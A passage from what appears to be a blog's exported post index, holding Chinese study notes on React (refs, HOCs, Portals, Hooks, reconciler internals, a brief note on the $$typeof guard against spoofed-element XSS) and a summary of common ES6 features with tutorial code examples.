ref=&#123;ref&#125; className=\"FancyButton\"&gt; &#123;props.children&#125; &lt;/button&gt;));// 可以直接获取&lt;button&gt;的refconst ref = React.createRef();&lt;FancyButton ref=&#123;ref&#125;&gt;Click me!&lt;/FancyButton&gt;; 在上面的例子中，ref挂载完成时ref.current将指向&lt;button&gt;DOM节点。 应用到HOC上： 123456789101112131415161718function logProps(Component) &#123; class LogProps extends React.Component &#123; componentDidUpdate(prevProps) &#123; console.log('old props:', prevProps); console.log('new props:', this.props); &#125; render() &#123; const &#123;forwardedRef, ...rest&#125; = this.props; return &lt;Component ref=&#123;forwardedRef&#125; &#123;...rest&#125; /&gt;; &#125; &#125; // 可将参数Ref作为常规prop属性传递给LogProps return React.forwardRef((props, ref) =&gt; &#123; return &lt;LogProps &#123;...props&#125; forwardedRef=&#123;ref&#125; /&gt;; &#125;);&#125; FragmentsFragments允许返回多个元素，无需向DOM添加额外节点。 1234567891011121314151617181920render() &#123; return ( &lt;React.Fragment&gt; &lt;ChildA /&gt; &lt;ChildB /&gt; &lt;ChildC /&gt; &lt;/React.Fragment&gt; );&#125;//或者用一种新的短语法render() &#123; return ( &lt;&gt; &lt;ChildA /&gt; &lt;ChildB /&gt; &lt;ChildC /&gt; &lt;/&gt; );&#125; 高阶组件HOC高阶组件是参数为组件并返回新组件的函数，用于复用组件逻辑。HOC是纯函数，没有副作用，将传入的组件包装在容器中而不进行修改，可以将HOC视为参数化容器组件。 一个例子： 1234567891011121314151617181920212223242526272829function withSubscription(WrappedComponent, selectData) &#123; return class extends React.Component &#123; constructor(props) &#123; super(props); this.handleChange = this.handleChange.bind(this); this.state = &#123; data: selectData(DataSource, props) &#125;; &#125; componentDidMount() &#123; DataSource.addChangeListener(this.handleChange); &#125; componentWillUnmount() &#123; DataSource.removeChangeListener(this.handleChange); &#125; handleChange() &#123; this.setState(&#123; data: selectData(DataSource, this.props) &#125;); &#125; render() &#123; return &lt;WrappedComponent data=&#123;this.state.data&#125; &#123;...this.props&#125; /&gt;; &#125; &#125;;&#125; 需要注意的点： 不要在render()中使用HOC，因为每次重新渲染时HOC都会被再次创建，导致子树每次渲染都要卸载并重新挂载，这不仅引起性能问题，还会导致该组件及其所有子组件的状态丢失。所以一般应在组件之外创建HOC，保证每次render都是同一个组件。 需要复制原始组件的静态方法，否则新组件没有原始组件的任何静态方法。可以通过组件名.静态方法名的方式添加，但这样必须知道要拷贝哪些方法；所以可以使用hoist-non-react-statics自动拷贝所有静态方法： 123456import hoistNonReactStatic from 'hoist-non-react-statics';function enhance(WrappedComponent) &#123; class Enhance extends React.Component &#123;/*...*/&#125; hoistNonReactStatic(Enhance, WrappedComponent); return Enhance;&#125; 或者可以额外导出静态方法。 Refs不会被传递，不过可以用forwardRef解决，详见上面的Refs转发部分。 PortalsPortals可以将子节点渲染到存在于父组件以外的DOM节点。 12//child是任何可渲染的React子元素，container是一个DOM元素ReactDOM.createPortal(child, container) 从portal内部触发的事件会一直冒泡至包含React树的祖先。 一个Modal组件的例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970// 两个兄弟级DOM容器const appRoot = document.getElementById('app-root');const modalRoot = document.getElementById('modal-root');class Modal extends React.Component &#123; constructor(props) &#123; super(props); this.el = document.createElement('div'); &#125; componentDidMount() &#123; modalRoot.appendChild(this.el); &#125; componentWillUnmount() &#123; modalRoot.removeChild(this.el); &#125; render() &#123; return ReactDOM.createPortal( this.props.children, this.el, ); &#125;&#125;class Parent extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123;clicks: 0&#125;; this.handleClick = this.handleClick.bind(this); &#125; handleClick() &#123; // 子元素里的按钮被点击会触发更新父元素的state // 即使这个按钮在 DOM 中不是直接关联的后代 this.setState(state =&gt; (&#123; clicks: state.clicks + 1 &#125;)); &#125; render() &#123; return ( &lt;div onClick=&#123;this.handleClick&#125;&gt; &lt;p&gt;Number of clicks: &#123;this.state.clicks&#125;&lt;/p&gt; &lt;p&gt; Open up the browser DevTools to observe that the button is not a child of the div with the onClick handler. &lt;/p&gt; &lt;Modal&gt; &lt;Child /&gt; &lt;/Modal&gt; &lt;/div&gt; ); &#125;&#125;function Child() &#123; // 这个按钮的点击事件会冒泡到父元素 // 因为这里没有定义 'onClick' 属性 return ( &lt;div className=\"modal\"&gt; &lt;button&gt;Click&lt;/button&gt; &lt;/div&gt; );&#125;ReactDOM.render(&lt;Parent /&gt;, appRoot); Diff算法对比两颗树时，先比较两颗树的根节点；若根节点为不同类型的元素，React会直接拆卸原来的树（对应的DOM节点和关联的state也被销毁）并建立新树。 当对比两个相同类型的React元素时，React会保留DOM节点，仅对比更新改变的属性。当一个组件更新时，组件实例保持不变，React将更新props使其与最新的元素保持一致。 当递归DOM节点的子元素时，React会同时遍历两个子元素的列表；若出现差异，则生成一个mutation。通常为子元素添加key值提升性能。 Hook使用 Hook 可以在不编写 class 的情况下使用 state 以及其他 React 特性；可以很方便地在无需修改组件结构的情况下复用状态逻辑；还可以将组件中相互关联的部分拆分成更小的函数。 生命周期方法对应Hook constructor：函数组件不需要构造函数。可以通过调用 useState 初始化 state。若计算的代价比较昂贵，可以传一个函数给 useState。 getDerivedStateFromProps：改为渲染时安排一次更新 shouldComponentUpdate： React.memo render：函数组件体本身 componentDidMount, componentDidUpdate, componentWillUnmount：useEffect 基础内置HookState Hook - useState12const [state, setState] = useState(initialState);setState(newState); 在函数组件中存储内部state（保存在函数作用域中）。在使用useState定义state时返回一个有两个值的数组，可以直接通过数组解构进行赋值；state hook在更新state时直接替换掉原来的state而不是合并。 Effect Hook - useEffect12//接收一个包含命令式且可能有副作用代码的函数effectuseEffect(didUpdate); Effect Hook可以看作componentDidMount，componentDidUpdate 和 componentWillUnmount 的组合。 与 componentDidMount 和 componentDidUpdate 不同，使用 useEffect 调度的 effect 在浏览器绘制后延迟执行，不会阻塞浏览器更新屏幕。 在class中没有提供每次渲染（包括首次）都会执行的方法，所以需要在componentDidMount和componentDidUpdate中重复写；而useEffect会告诉React组件需要在渲染后执行哪些操作，在默认情况下useEffect在首次渲染和每次更新后都会执行，每次重新渲染都会生成新的effect，React 会在执行当前 effect 之前清除上一个 effect 。 可以使用多个effect，将不相关逻辑分离到不同的effect中。 1234567891011121314151617181920function FriendStatusWithCounter(props) &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; document.title = `You clicked $&#123;count&#125; times`; &#125;); const [isOnline, setIsOnline] = useState(null); useEffect(() =&gt; &#123; function handleStatusChange(status) &#123; setIsOnline(status.isOnline); &#125; ChatAPI.subscribeToFriendStatus(props.friend.id, handleStatusChange); //返回一个取消订阅的函数（该清除函数会在组件卸载前执行） return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(props.friend.id, handleStatusChange); &#125;; &#125;); // ...&#125; 由于默认每次渲染后effect都会执行，可以向useEffect传入第二个参数（effect所依赖的值数组）控制是否要跳过对effect的调用，仅在数组中的值发生改变时更新，需要确保数组中包含了所有外部作用域中会随时间变化并且在 effect 中使用的变量，否则会引用到先前渲染中的旧变量。如果想仅在组件挂载或卸载时执行effect，可以直接传递一个空数组，告诉React这个effect不依赖于任何props或state值，所以不需要重复执行。 如果在effect中设置定时器，可能会出现每次依赖值更新定时器都被重置的情况（如下）： 123456789101112function Counter() &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(count + 1); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, [count]); return &lt;h1&gt;&#123;count&#125;&lt;/h1&gt;;&#125; 可以使用setState的函数式更新形式解决（如下所示），这样就可以指定state该如何改变而不是引用当前state，effect不依赖于外部的state值也就不会被重复调用，所以定时器就不会被重置了。 123456789101112function Counter() &#123; const [count, setCount] = useState(0); useEffect(() =&gt; &#123; const id = setInterval(() =&gt; &#123; setCount(c =&gt; c + 1); &#125;, 1000); return () =&gt; clearInterval(id); &#125;, []); return &lt;h1&gt;&#123;count&#125;&lt;/h1&gt;;&#125; 一些注意点： 关于依赖项：若effect引用的外部函数不引用props、state以及由他们衍生而来的值，可以在依赖列表中省略。 只在更新时执行effect：可以使用一个可变的ref手动在.current属性里存储一个布尔值来表示是首次渲染还是后续渲染，在effect中检查这个标识。 useContext123//接收一个context对象//返回上层组件中距离当前组件最近的&lt;MyContext.Provider&gt;的value值const value = useContext(MyContext); 当组件上层最近的 &lt;MyContext.Provider&gt; 更新时，该 Hook 会触发重渲染，并使用最新传递给 MyContextprovider 的 context value 值。 即使祖先使用 React.memo 或 shouldComponentUpdate，调用了 useContext 的组件总会在 context 值变化时重新渲染。 额外内置HookuseReducer12//第三个参数是init(initialArg)函数，用于惰性初始化或者重置stateconst [state, dispatch] = useReducer(reducer, initialArg, init); 使用useReducer重写计数器的例子： 1234567891011121314151617181920212223const initialState = &#123;count: 0&#125;;function reducer(state, action) &#123; switch (action.type) &#123; case 'increment': return &#123;count: state.count + 1&#125;; case 'decrement': return &#123;count: state.count - 1&#125;; default: throw new Error(); &#125;&#125;function Counter() &#123; const [state, dispatch] = useReducer(reducer, initialState); return ( &lt;&gt; Count: &#123;state.count&#125; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: 'decrement'&#125;)&#125;&gt;-&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: 'increment'&#125;)&#125;&gt;+&lt;/button&gt; &lt;/&gt; );&#125; React 确保 dispatch 函数的标识是稳定的，并且不会在组件重新渲染时改变，所以可以在 useEffect 和 useCallback 的依赖列表中省略 dispatch 。 如果 Reducer Hook 的返回值与当前 state 相同（使用 Object.is 比较），React 将跳过子组件的渲染及副作用的执行。 useCallback通常用于包裹传入子组件的方法来优化性能，只有依赖项改变才更新，避免随渲染发生改变。 12345678// 传入内联回调函数以及依赖项数组// 返回传入的回调函数的memorized版本const memoizedCallback = useCallback( () =&gt; &#123; doSomething(a, b); &#125;, [a, b],); useCallback(fn, deps) 相当于 useMemo(() =&gt; fn, deps)。 可以利用 callBack ref 测量DOM节点： 123456789101112131415161718192021function useClientRect() &#123; const [rect, setRect] = useState(null); const ref = useCallback(node =&gt; &#123; if (node !== null) &#123; setRect(node.getBoundingClientRect()); &#125; &#125;, []); return [rect, ref];&#125;function MeasureExample() &#123; const [rect, ref] = useClientRect(); return ( &lt;&gt; &lt;h1 ref=&#123;ref&#125;&gt;Hello, world&lt;/h1&gt; &#123;rect !== null &amp;&amp; &lt;h2&gt;The above header is &#123;Math.round(rect.height)&#125;px tall&lt;/h2&gt; &#125; &lt;/&gt; );&#125; useMemo用于性能优化，可以单独优化具体的子节点。 123// 传入“创建”函数和依赖项数组// 返回memorized值const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]); 可以用React.memo包裹一个组件并对props进行浅比较来实现shouldComponentUpdate。 useRef1const refContainer = useRef(initialValue); useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数initialValue（一般直接传入null）。返回的 ref 对象在组件的整个生命周期内保持不变，变更 .current 属性不会引发组件重渲染，如果想要在 React 绑定或解绑 DOM 节点的 ref 时执行某些操作，则需要使用 回调ref 来实现。 useRef可用于获取上一轮的props或state： 12345678910111213function usePrevious(value) &#123; const ref = useRef(); useEffect(() =&gt; &#123; ref.current = value; &#125;); return ref.current;&#125;function Counter() &#123; const [count, setCount] = useState(0); const prevCount = usePrevious(count); return &lt;h1&gt;Now: &#123;count&#125;, before: &#123;prevCount&#125;&lt;/h1&gt;;&#125; useImperativeHandle通常与forwardRef一起使用，可以在使用ref时自定义暴露给父组件的实例值。 1useImperativeHandle(ref, createHandle, [deps]) 例子： 12345678910function FancyInput(props, ref) &#123; const inputRef = useRef(); useImperativeHandle(ref, () =&gt; (&#123; focus: () =&gt; &#123; inputRef.current.focus(); &#125; &#125;)); return &lt;input ref=&#123;inputRef&#125; ... /&gt;;&#125;FancyInput = forwardRef(FancyInput); 引用的父组件可以获取到inputRef.current。 自定义Hook即定义名称以”use”开头的函数，其内部可调用其他Hook，自定义参数和返回值。 例子： 123456789101112131415161718import React, &#123; useState, useEffect &#125; from 'react';function useFriendStatus(friendID) &#123; const [isOnline, setIsOnline] = useState(null); useEffect(() =&gt; &#123; function handleStatusChange(status) &#123; setIsOnline(status.isOnline); &#125; ChatAPI.subscribeToFriendStatus(friendID, handleStatusChange); return () =&gt; &#123; ChatAPI.unsubscribeFromFriendStatus(friendID, handleStatusChange); &#125;; &#125;); return isOnline;&#125; 使用上面自定义的Hook 12345678function FriendStatus(props) &#123; const isOnline = useFriendStatus(props.friend.id); if (isOnline === null) &#123; return 'Loading...'; &#125; return isOnline ? 'Online' : 'Offline';&#125; 实现一个useReducer的简化版本： 12345678910function useReducer(reducer, initialState) &#123; const [state, setState] = useState(initialState); function dispatch(action) &#123; const nextState = reducer(state, action); setState(nextState); &#125; return [state, dispatch];&#125; Addition！element &amp; component &amp; instanceAn element is a plain object describing what you want to appear on the screen in terms of the DOM nodes or other components. Elements can contain other elements in their props. Creating a React element is cheap. Once an element is created, it is never mutated. A component can be declared in several different ways. It can be a class with a render()method. Alternatively, in simple cases, it can be defined as a function. In either case, it takes props as an input, and returns an element tree as the output. When a component receives some props as an input, it is because a particular parent component returned an element with its type and these props. This is why people say that the props flows one way in React: from parents to children. An instance is what you refer to as this in the component class you write. It is useful for storing local state and reacting to the lifecycle events. Function components don’t have instances at all. Class components have instances, but you never need to create a component instance directly—React takes care of this. Finally, to create elements, use React.createElement(), JSX, or an element factory helper. Don’t write elements as plain objects in the real code—just know that they are plain objects under the hood. Link：click here Implementation Notes (pre-React16)[Based on stack reconciler] Mounting as a Recursive Process：Consider the first time we mount a component,&lt;App /&gt;,React DOM will pass this component to the reconciler. If App is a class, the reconciler will instantiate an App with new App(props), call the componentWillMount() lifecycle method, and then will call the render() method to get the rendered element. If App is a function, the reconciler will call App(props) to get the rendered element. This process is recursive. The reconciler will “drill down” through user-defined components recursively as it learns what each component renders to. Mounting Host Elements：If element’s type property is a string, we are dealing with a host element (like &lt;div&gt;). When the reconciler encounters a host element, it lets the renderer take care of mounting it. For example, React DOM would create a DOM node. If the host element has children, the reconciler recursively mounts them following the same algorithm as above. The DOM nodes produced by the child components will be appended to the parent DOM node, and recursively, the complete DOM structure will be assembled. Internal Instances： The key feature of React is that you can re-render everything, and it won’t recreate the DOM or reset the state. To perform updates on the initial tree, all the necessary information should be stored, such as all the publicInstances, or which DOM nodes correspond to which components. The stack reconciler codebase solves this by making the mount() function a method and putting it on a class. (Stack reconciler has been replaced by Fiber reconciler now because of its several drawbacks.) Internal instances hold onto their children and the DOM nodes. unmounting：For a composite component, unmounting calls a lifecycle method and recurses. For DOMComponent, unmounting tells each child to unmount. Updating：The goal of the reconciler is to reuse existing instances where possible to preserve the DOM and the state. This is the part that is often described as “virtual DOM diffing” although what really happens is that we walk the internal tree recursively and let each internal instance receive an update. When a composite component receives a new element, we run the componentWillUpdate()lifecycle method. Then we re-render the component with the new props, and get the next rendered element. If the type of the rendered element has not changed since the last render, we can just tell the corresponding internal instance to receive() the next element. However, if the next rendered element has a different type than the previously rendered element, we can’t update the internal instance. Instead, we have to unmount the existing internal instance and mount the new one corresponding to the rendered element type. Host component implementations, such as DOMComponent, update differently. When they receive an element, they need to update the underlying platform-specific view. In case of React DOM, this means updating the DOM attributes. Then, host components need to update their children. As the last step, we execute the DOM operations. Link：click here XSS Vulnerability Protection由于之前人为构造的JSON可以通过伪造成ReactElement的形式被误认为是真的Element而被渲染（主要影响服务器端渲染），如果再利用dangerouslySetInnerHTML属性就可以构造XSS攻击。 所以有了$$typeof: REACT_ELEMENT_TYPE这个属性，这是个Symbol类型的值，用于辨别ReactElement Link：XSS via a spoofed React element","categories":[],"tags":[{"name":"React","slug":"React","permalink":"http://yoursite.com/tags/React/"}]},{"title":"ES6常用新特性整理","slug":"ES6常用新特性整理","date":"2019-08-06T08:16:50.000Z","updated":"2019-08-15T11:48:49.006Z","comments":true,"path":"2019/08/06/ES6常用新特性整理/","link":"","permalink":"http://yoursite.com/2019/08/06/ES6常用新特性整理/","excerpt":"","text":"ES6常用新特性整理letlet与var的不同 let所声明的变量只在所在的块级作用域有效。比如花括号内，还有for循环每轮循环的i都是新的变量，而且设置循环变量的部分是父作用域，而循环体内部是单独的子作用域，两者也是互不干扰的。 let不存在变量提升，变量必须要在声明之后才能使用。 只要块级作用域内使用let声明了变量，那么这个变量就被绑定到这个区域，不受外部影响。 不允许重复声明。 块级作用域let实际上为JS在全局作用域和函数作用域的基础上新增了块级作用域。同一个变量名可以在不同的层级重新声明，每一层都是一个单独的作用域，互不影响。 1234567function f() &#123; let n = 1; if (true) &#123; let n = 2; &#125; console.log(n); // 1&#125; ES5 规定，函数只能在顶层作用域和函数作用域之中声明，不能在块级作用域声明，如if(true){}，try{}catch(e){}。 ES6 引入了块级作用域，明确允许在块级作用域之中声明函数。ES6 规定，块级作用域之中，函数声明语句的行为类似于let，在块级作用域之外不可引用。 ES6 的块级作用域必须有大括号，如果没有大括号，JavaScript 引擎就认为不存在块级作用域。 注：考虑到环境导致的行为差异太大，应该避免在块级作用域内声明函数。如果确实需要，也应该写成函数表达式，而不是函数声明语句。 const 只读的常量，声明后值不变 声明变量时必须初始化，声明不赋值会报错 变量不提升，先声明后使用 const的本质是变量指向的内存地址所保存的数据不得改动，对于复合类型的数据如对象和数组，变量指向的内存地址保存的是指向实际数据的指针，const保证这个指针不变，所以给对象添加新属性并不会报错。 解构赋值数组的解构赋值类似模式匹配，只要等号两边的模式相同，左边的变量就会被赋予对应的值。 1234let [x, y, ...z] = ['a'];x // \"a\"y // undefinedz // [] 如果等号右边不是可遍历的结构，那么将会报错。 1234567// 报错let [foo] = 1;let [foo] = false;let [foo] = NaN;let [foo] = undefined;let [foo] = null;let [foo] = &#123;&#125;; 上面的语句都会报错，因为等号右边的值要么转为对象以后不具备 Iterator 接口，要么本身就不具备 Iterator 接口。 事实上，只要某种数据结构具有 Iterator 接口，都可以采用数组形式的解构赋值。 例如下面这个Generator函数： 1234567891011function* fibs() &#123; let a = 0; let b = 1; while (true) &#123; yield a; [a, b] = [b, a + b]; &#125;&#125;let [first, second, third, fourth, fifth, sixth] = fibs();sixth // 5 默认值：只有解构被赋予的值严格等于undefined才生效，并且如果能直接取到非undefined的值就不会去求默认值。 12345let [x = 1] = [undefined];x // 1let [x = 1] = [null];x // null 对象的解构赋值与数组的解构赋值类似 123456let &#123; bar, foo &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;foo // \"aaa\"bar // \"bbb\"let &#123; baz &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;baz // undefined 如果变量名与属性名不一致用以下写法： 1234let obj = &#123; first: 'hello', last: 'world' &#125;;let &#123; first: f, last: l &#125; = obj;f // 'hello'l // 'world' 对象的解构赋值是下面形式的简写： 1let &#123; foo: foo, bar: bar &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;; 对象解构赋值的内部机制是先找到同名属性，然后再赋给对应的变量。真正被赋值的是后者，而不是前者。 123let &#123; foo: baz &#125; = &#123; foo: 'aaa', bar: 'bbb' &#125;;baz // \"aaa\"foo // error: foo is not defined 在上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。 函数参数的解构赋值12345678function move(&#123;x = 0, y = 0&#125; = &#123;&#125;) &#123; return [x, y];&#125;move(&#123;x: 3, y: 8&#125;); // [3, 8]move(&#123;x: 3&#125;); // [3, 0]move(&#123;&#125;); // [0, 0]move(); // [0, 0] 字符串字符串遍历器接口123for (let char of 'hello') &#123; console.log(char)&#125; 模板字符串12345info = &#123; name: 'nancy', desc: 'hahaha'&#125;let str = `Hi, i'm $&#123;info.name&#125;! $&#123;info.desc&#125;~`; 1234567//这里的空格和缩进都会保留$('#list').html(`&lt;ul&gt; &lt;li&gt;first&lt;/li&gt; &lt;li&gt;second&lt;/li&gt;&lt;/ul&gt;`); 模板字符串之中还能调用函数 12345function fn() &#123; return \"Hello World\";&#125;`$&#123;fn()&#125;` // Hello World includes(), startsWith(), endsWith() includes()：返回布尔值，表示是否找到了参数字符串。 startsWith()：返回布尔值，表示参数字符串是否在原字符串的头部。 endsWith()：返回布尔值，表示参数字符串是否在原字符串的尾部。 函数的扩展箭头函数ES6 允许使用“箭头”（=&gt;）定义函数。 1234567891011121314151617var f = v =&gt; v;// 等同于var f = function (v) &#123; return v;&#125;;var sum = (num1, num2) =&gt; num1 + num2;// 等同于var sum = function(num1, num2) &#123; return num1 + num2;&#125;;[1,2,3].map(function (x) &#123; return x * x;&#125;);// 等同于[1,2,3].map(x =&gt; x * x); 注意点： 函数体内的this对象，就是定义时所在的对象，而不是使用时所在的对象；this会绑定定义时所在的作用域，而不是运行时所在的作用域。 this指向的固定化，并不是因为箭头函数内部有绑定this的机制，实际上是箭头函数根本没有自己的this，导致内部的this就是外层代码块的this。正是因为它没有this，所以也就不能用作构造函数。 123456789101112131415function foo() &#123; return () =&gt; &#123; return () =&gt; &#123; return () =&gt; &#123; console.log('id:', this.id); &#125;; &#125;; &#125;;&#125;var f = foo.call(&#123;id: 1&#125;);var t1 = f.call(&#123;id: 2&#125;)()(); // id: 1var t2 = f().call(&#123;id: 3&#125;)(); // id: 1var t3 = f()().call(&#123;id: 4&#125;); // id: 1 上面代码之中，只有一个this，就是函数foo的this，所以t1、t2、t3都输出同样的结果。因为所有的内层函数都是箭头函数，都没有自己的this，它们的this其实都是最外层foo函数的this。 不可以当作构造函数，不可以使用new命令 。 不可以使用arguments对象，该对象在函数体内不存在。如果要用，可以用 rest 参数代替。 不可以使用yield命令，因此箭头函数不能用作 Generator 函数。 箭头函数不适用的场景： 不适于定义对象的方法： 123456const obj = &#123; count: 0, add: () =&gt; &#123; this.count++; &#125;&#125; 这里的obj.add()使用了箭头函数，在调用obj.add()的时候this会指向全局对象，因为对象不构成单独的作用域，导致add方法定义时的作用域就是全局作用域，所以这里不能使用箭头函数。 不适于需要动态this的场合： 1234let button = document.getElementById('press');button.addEventListener('click', () =&gt; &#123; this.classList.toggle('on');&#125;); 上面代码运行时，点击按钮会报错，因为button的监听函数是一个箭头函数，导致里面的this就是全局对象。如果改成普通函数，this就会动态指向被点击的按钮对象。 rest参数形为：...变量名 1const sortNumbers = (...numbers) =&gt; numbers.sort(); 注意rest 参数之后不能再有其他参数（即只能是最后一个参数），否则报错。 1234// 报错function f(a, ...b, c) &#123; // ...&#125; 数组的扩展扩展运算符扩展运算符（spread）是三个点（...）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。 123let arr1 = [0, 1, 2];let arr2 = [3, 4, 5];arr1.push(...arr2); Array.from()Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象。 123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] 任何有length属性的对象，都可以通过Array.from方法转为数组 12Array.from(&#123; length: 3 &#125;);// [ undefined, undefined, undefined ] Array.from还可以接受第二个参数，作用类似于数组的map方法，用来对每个元素进行处理，将处理后的值放入返回的数组。 123456Array.from(arrayLike, x =&gt; x * x);// 等同于Array.from(arrayLike).map(x =&gt; x * x);Array.from([1, 2, 3], (x) =&gt; x * x)// [1, 4, 9] Array.of()Array.of方法用于将一组值，转换为数组。 Array.of总是返回参数值组成的数组；如果没有参数，就返回一个空数组。 123Array.of() // []Array.of(1) // [1]Array.of(undefined) // [undefined] find() 和 findIndex()数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined。 find方法的回调函数可以接受三个参数，依次为当前的值、当前的位置和原数组。 123[1, 5, 10, 15].find(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 10 数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。 includes()includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。 对象的扩展属性简洁表示ES6 允许直接写入变量和函数，作为对象的属性和方法。 12345678910111213141516const foo = 'bar';const baz = &#123;foo&#125;;baz // &#123;foo: \"bar\"&#125;const o = &#123; method() &#123; return \"Hello!\"; &#125;&#125;;// 等同于const o = &#123; method: function() &#123; return \"Hello!\"; &#125;&#125;; CommonJS 模块输出一组变量，就非常合适使用简洁写法。 12345678910111213let ms = &#123;&#125;;function getItem (key) &#123; return key in ms ? ms[key] : null;&#125;function setItem (key, value) &#123; ms[key] = value;&#125;function clear () &#123; ms = &#123;&#125;;&#125;module.exports = &#123; getItem, setItem, clear &#125;; super 关键字指向当前对象的原型对象。 super关键字表示原型对象时，只能用在对象的方法之中，用在其他地方都会报错。 12345678910111213const proto = &#123; foo: 'hello'&#125;;const obj = &#123; foo: 'world', find() &#123; return super.foo; &#125;&#125;;Object.setPrototypeOf(obj, proto);obj.find() // \"hello\" Object.assign()Object.assign方法用于对象的合并，将源对象（source）的所有可枚举属性，复制到目标对象（target）。 Object.assign方法的第一个参数是目标对象，后面的参数都是源对象。 1234567const target = &#123; a: 1 &#125;;const source1 = &#123; b: 2 &#125;;const source2 = &#123; c: 3 &#125;;Object.assign(target, source1, source2);target // &#123;a:1, b:2, c:3&#125; Object.assign拷贝的属性是有限制的，只拷贝源对象的自身属性（不拷贝继承属性），也不拷贝不可枚举的属性（enumerable: false）。 注意点： Object.assign方法实行的是浅拷贝，而不是深拷贝。也就是说，如果源对象某个属性的值是对象，那么目标对象拷贝得到的是这个对象的引用。 12345const obj1 = &#123;a: &#123;b: 1&#125;&#125;;const obj2 = Object.assign(&#123;&#125;, obj1);obj1.a.b = 2;obj2.a.b // 2 对于同名属性，Object.assign的处理方法是替换而不是添加。 1234const target = &#123; a: &#123; b: 'c', d: 'e' &#125; &#125;const source = &#123; a: &#123; b: 'hello' &#125; &#125;Object.assign(target, source)// &#123; a: &#123; b: 'hello' &#125; &#125; Object.assign可以用来处理数组，但是会把数组视为对象。 12Object.assign([1, 2, 3], [4, 5])// [4, 5, 3] 上面代码中，Object.assign把数组视为属性名为 0、1、2 的对象，因此源数组的 0 号属性4覆盖了目标数组的 0 号属性1。 Object.keys()，Object.values()，Object.entries()Object.keys方法，返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键名。 Object.values方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值。 Object.entries()方法返回一个数组，成员是参数对象自身的（不含继承的）所有可遍历（enumerable）属性的键值对数组。 SymbolSymbol()，getOwnPropertySymbols()ES6 引入了一种新的原始数据类型Symbol，表示独一无二的值。它是 JavaScript 语言的第七种数据类型，前六种是：undefined、null、布尔值（Boolean）、字符串（String）、数值（Number）、对象（Object）。 Symbol 值通过Symbol函数生成。 凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突。 Symbol 作为属性名，该属性不会出现在for...in、for...of循环中，也不会被Object.keys()、Object.getOwnPropertyNames()、JSON.stringify()返回。但是，它也不是私有属性，有一个Object.getOwnPropertySymbols方法，可以获取指定对象的所有 Symbol 属性名。 Object.getOwnPropertySymbols方法返回一个数组，成员是当前对象的所有用作属性名的 Symbol 值。 1234567891011const obj = &#123;&#125;;let a = Symbol('a');let b = Symbol('b');obj[a] = 'Hello';obj[b] = 'World';const objectSymbols = Object.getOwnPropertySymbols(obj);objectSymbols// [Symbol(a), Symbol(b)] 另一个新的 API，Reflect.ownKeys方法可以返回所有类型的键名，包括常规键名和 Symbol 键名。 12345678let obj = &#123; [Symbol('my_key')]: 1, enum: 2, nonEnum: 3&#125;;Reflect.ownKeys(obj)// [\"enum\", \"nonEnum\", Symbol(my_key)] Symbol.for()，Symbol.keyFor()有时，我们希望重新使用同一个 Symbol 值，Symbol.for方法可以做到这一点。它接受一个字符串作为参数，然后搜索有没有以该参数作为名称的 Symbol 值。如果有，就返回这个 Symbol 值，否则就新建并返回一个以该字符串为名称的 Symbol 值。 1234let s1 = Symbol.for('foo');let s2 = Symbol.for('foo');s1 === s2 // true Symbol.for()与Symbol()这两种写法，都会生成新的 Symbol。它们的区别是，前者会被登记在全局环境中供搜索，后者不会。Symbol.for()不会每次调用就返回一个新的 Symbol 类型的值，而是会先检查给定的key是否已经存在，如果不存在才会新建一个值。 12345Symbol.for(\"bar\") === Symbol.for(\"bar\")// trueSymbol(\"bar\") === Symbol(\"bar\")// false Symbol.keyFor方法返回一个已登记的 Symbol 类型值的key。 12345let s1 = Symbol.for(\"foo\");Symbol.keyFor(s1) // \"foo\"let s2 = Symbol(\"foo\");Symbol.keyFor(s2) // undefined Set和MapSet的基本属性和方法Set 结构的实例有以下属性： Set.prototype.constructor：构造函数，默认就是Set函数。 Set.prototype.size：返回Set实例的成员总数。 Set 实例的方法分为两大类：操作方法（用于操作数据）和遍历方法（用于遍历成员）。 Set.prototype.add(value)：添加某个值，返回 Set 结构本身。 Set.prototype.delete(value)：删除某个值，返回一个布尔值，表示删除是否成功。 Set.prototype.has(value)：返回一个布尔值，表示该值是否为Set的成员。 Set.prototype.clear()：清除所有成员，没有返回值。 Set.prototype.keys()：返回键名的遍历器 Set.prototype.values()：返回键值的遍历器 Set.prototype.entries()：返回键值对的遍历器 Set.prototype.forEach()：使用回调函数遍历每个成员 Map的基本属性和方法 size 属性 Map.prototype.set(key, value)：设置键名key对应的键值为value Map.prototype.get(key)：读取key对应的键值 Map.prototype.has(value)：返回一个布尔值 Map.prototype.delete(key) ：删除某个键，返回true；如果删除失败，返回false。 Map.prototype.clear()：清除所有成员，没有返回值。 